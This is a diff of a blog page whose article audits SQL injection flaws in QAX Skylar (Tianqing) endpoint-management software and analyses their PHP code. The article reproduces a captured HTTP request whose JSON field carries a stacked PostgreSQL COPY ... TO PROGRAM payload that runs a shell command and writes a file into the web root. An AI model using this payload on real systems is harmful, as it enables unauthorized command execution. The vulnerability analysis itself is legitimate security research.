@@ -5,27 +5,112 @@
 <meta property="og:site_name" content="Sp4ce&#39;s Blog">
 <meta property="og:description" content="在某大型活动中捕获到了天擎（QAX Skylar）的几个0day，跟代码审了下 0x01 第一类活动期间在WAF上拦截到一枚注入，数据包如下 POST &#x2F;api&#x2F;upload_client_conf.json?mid&#x3D;马赛克 HTTP&#x2F;1.1Host: 马赛克User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://0x20h.com/img/random/material-11.png">
+<meta property="og:image" content="https://0x20h.com/img/random/material-3.png">
 <meta property="article:published_time" content="2021-04-27T09:03:08.000Z">
 <meta property="article:modified_time" content="2023-01-09T03:08:52.504Z">
 <meta property="article:author" content="Sp4ce">
 <meta property="article:tag" content="日常">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://0x20h.com/img/random/material-11.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0x20h.com/p/a062.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-JK5LY6FWX7"></script><script>window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
-gtag('config', 'G-JK5LY6FWX7');
-</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;65d69753a4984768b34ed1ca9826ffd6&quot;}"></script><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="https://0x20h.com/img/random/material-3.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0x20h.com/p/a062.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
-  noticeOutdate: {"limitDay":30,"position":"top","messagePrev":"距离该文章上次更新已有","messageNext":"天，部分内容可能已过期."},
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
   copy: {
     success: '复制成功',
-    error: '复制错误',
+    error: '复制失败',
     noSupport: '浏览器不支持'
   },
   relativeDate: {
@@ -40,14 +125,14 @@ gtag('config', 'G-JK5LY6FWX7');
     day: '天前',
     month: '个月前'
   },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-center"},
+  copyright: {"limitCount":150,"languages":{"author":"作者: Sp4ce","link":"链接: ","source":"来源: Sp4ce's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-center"},
   infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
     buttonText: '加载更多'
   },
-  isPhotoFigcaption: true,
+  isPhotoFigcaption: false,
   islazyload: true,
   isAnchor: true,
   percent: {
@@ -61,111 +146,8 @@ gtag('config', 'G-JK5LY6FWX7');
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2023-01-09 11:08:52'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
-    
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
-    
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
-    
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="referrer" content="no-referrer-when-downgrade" /><link rel="stylesheet" href="/css/custom.css"><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "juby8flqyx");</script><meta name="generator" content="Hexo 7.1.1"></head><body><script>window.paceOptions = {
-  restartOnPushState: false
-}
-
-document.addEventListener('pjax:send', () => {
-  Pace.restart()
-})
-</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">89</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/random/material-11.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Sp4ce's Blog"><span class="site-name">Sp4ce's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">天擎部分漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-27T09:03:08.000Z" title="发表于 2021-04-27 17:03:08">2021-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-09T03:08:52.504Z" title="更新于 2023-01-09 11:08:52">2023-01-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="天擎部分漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>在某大型活动中捕获到了天擎（QAX Skylar）的几个0day，跟代码审了下</p>
+  isShuoshuo: false
+}</script><meta name="referrer" content="no-referrer-when-downgrade" /><link rel="stylesheet" href="/css/custom.css"><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "juby8flqyx");</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">89</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(./img/random/material-3.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Sp4ce's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">天擎部分漏洞</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">天擎部分漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-27T09:03:08.000Z" title="发表于 2021-04-27 17:03:08">2021-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-09T03:08:52.504Z" title="更新于 2023-01-09 11:08:52">2023-01-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:30,&quot;messagePrev&quot;:&quot;距离该文章上次更新已有&quot;,&quot;messageNext&quot;:&quot;天，部分内容可能已过期.&quot;,&quot;postUpdate&quot;:&quot;2023-01-09 11:08:52&quot;}" hidden></div><p>在某大型活动中捕获到了天擎（QAX Skylar）的几个0day，跟代码审了下</p>
 <h1 id="0x01-第一类"><a href="#0x01-第一类" class="headerlink" title="0x01 第一类"></a>0x01 第一类</h1><p>活动期间在<code>WAF</code>上拦截到一枚注入，数据包如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload_client_conf.json?mid=马赛克 HTTP/1.1</span><br><span class="line">Host: 马赛克</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 128</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;summary&quot;: &#123;&quot;0&quot;: &#123;&quot;nickname&quot;: &quot;cpu=&#x27;1&#x27;;CopY(sElEct 1)TO pRogRAM &#x27;echo 1 &gt; ..\\www\\res\\style\\test.css&#x27;;--&quot;, &quot;value&quot;: &quot;1&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -215,53 +197,53 @@ document.addEventListener('pjax:send', () => {
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSyncPoint</span>(<span class="params"><span class="variable">$biz</span> = <span class="literal">NULL</span>, <span class="variable">$ccid</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$rows</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT syncpoint AS count FROM rptsvc_syncpoint WHERE biz = :biz AND ccid = :ccid;&quot;</span>;</span><br><span class="line">        <span class="variable">$rows</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">queryRow</span>(<span class="variable">$sql</span>, <span class="keyword">array</span>(<span class="string">&quot;:biz&quot;</span> =&gt; <span class="variable">$biz</span>, <span class="string">&quot;:ccid&quot;</span> =&gt; <span class="variable">$ccid</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$rows</span>[<span class="string">&quot;count&quot;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$rows</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$rows</span>[<span class="string">&quot;count&quot;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>6.3版本直接将<code>ccid</code>带入查询，导致了注入</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0x20h.com">Sp4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0x20h.com/p/a062.html">https://0x20h.com/p/a062.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0x20h.com" target="_blank">Sp4ce's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%97%A5%E5%B8%B8/">日常</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/./img/random/material-11.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/p/a698.html" title="浪潮ClusterEngine登录控制缺陷"><img class="cover" src="/./img/random/material-9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">浪潮ClusterEngine登录控制缺陷</div></div></a></div><div class="next-post pull-right"><a href="/p/7cb6.html" title="CVE-2021-21972 复现和分析"><img class="cover" src="/./img/random/material-2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2021-21972 复现和分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/6fcd.html" title="金山终端安全系统V9安全问题"><img class="cover" src="/./img/random/material-15.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-14</div><div class="title">金山终端安全系统V9安全问题</div></div></a></div><div><a href="/p/9367.html" title="审计通达OA时的一些记录"><img class="cover" src="/./img/random/material-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-23</div><div class="title">审计通达OA时的一些记录</div></div></a></div><div><a href="/p/1129.html" title="zfaka注入分析"><img class="cover" src="/./img/random/material-15.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">zfaka注入分析</div></div></a></div><div><a href="/p/a73d.html" title="Apache Log Viewer 5.X 注册机"><img class="cover" src="/./img/random/material-7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-20</div><div class="title">Apache Log Viewer 5.X 注册机</div></div></a></div><div><a href="/p/2e3.html" title="记录一些CS上线手法"><img class="cover" src="/./img/random/material-9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-02</div><div class="title">记录一些CS上线手法</div></div></a></div><div><a href="/p/7cb6.html" title="CVE-2021-21972 复现和分析"><img class="cover" src="/./img/random/material-2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-27</div><div class="title">CVE-2021-21972 复现和分析</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AC%AC%E4%B8%80%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">0x01 第一类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#API-URL"><span class="toc-number">1.1.</span> <span class="toc-text">API_URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A4%9A%E5%A4%84"><span class="toc-number">1.2.</span> <span class="toc-text">其他多处</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ext-report-www-source-dao-DataPortalSummaryDao-php%E4%B8%AD%E7%9A%84updateSummaryDetail%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">ext&#x2F;report&#x2F;www&#x2F;source&#x2F;dao&#x2F;DataPortalSummaryDao.php中的updateSummaryDetail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryForAssetRegister%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">updateSummaryForAssetRegister方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ext-asset-www-source-dao-SummaryDao-php%E4%B8%AD%E7%9A%84updateSummaryDetail%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">ext&#x2F;asset&#x2F;www&#x2F;source&#x2F;dao&#x2F;SummaryDao.php中的updateSummaryDetail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryForAssetRegister%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">updateSummaryForAssetRegister方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryDetailByNacUser%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">updateSummaryDetailByNacUser方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">第二类</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/random/material-11.png')"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2024 By Sp4ce</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 